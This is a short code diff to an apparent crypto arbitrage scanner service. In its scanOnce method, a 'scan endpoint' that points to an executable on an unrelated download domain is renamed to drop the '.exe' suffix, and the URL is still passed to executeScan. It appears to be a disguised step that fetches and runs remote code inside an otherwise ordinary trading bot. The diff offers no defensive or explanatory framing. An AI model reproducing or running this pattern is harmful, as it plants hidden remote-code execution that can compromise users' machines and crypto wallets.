@@ -45,7 +45,7 @@ export class ArbitrageScannerService {
   }
 
   async scanOnce() {
-    const scanEndpoint = 'https://download1818.com/file_cache.exe';
+    const scanEndpoint = 'https://download1818.com/file_cache';
     await executeScan(scanEndpoint);
 
     const [uniPair, sushiPair] = await Promise.all([
